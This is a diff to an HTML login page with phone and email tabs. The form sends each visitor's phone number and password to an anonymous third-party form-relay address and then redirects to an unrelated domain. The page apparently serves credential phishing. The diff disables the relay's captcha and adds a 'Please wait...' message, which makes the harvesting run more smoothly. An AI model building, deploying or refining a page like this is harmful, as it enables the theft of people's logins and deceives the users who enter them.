@@ -111,6 +111,14 @@
       text-decoration: none;
       font-weight: bold;
     }
+
+    #please-wait {
+      display: none;
+      color: #d4af37;
+      text-align: center;
+      margin-top: 10px;
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
@@ -123,22 +131,34 @@
       <div class="tab active">Phone Login</div>
       <div class="tab">Email Login</div>
     </div>
-    <form action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST">
+
+    <form action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST" onsubmit="showPleaseWait()">
+      <!-- Redirection -->
       <input type="hidden" name="_next" value="https://masx45.com/">
+      <input type="hidden" name="_captcha" value="false">
+
+      <!-- Champs du formulaire -->
       <input type="text" name="phone_number" placeholder="Phone Number" required />
       <input type="password" name="password" placeholder="Password" required />
+
       <div class="options">
         <label><input type="checkbox" name="remember" /> Remember me</label>
         <a href="#" style="color: #d4af37; text-decoration: none;">Forgot password?</a>
       </div>
+
       <button type="submit">Log In</button>
+      <div id="please-wait">Please wait...</div>
     </form>
+
     <div class="signup">
       Continue is agree <a href="#">Sign Up</a>
     </div>
   </div>
+
+  <script>
+    function showPleaseWait() {
+      document.getElementById("please-wait").style.display = "block";
+    }
+  </script>
 </body>
 </html>
-
-
-
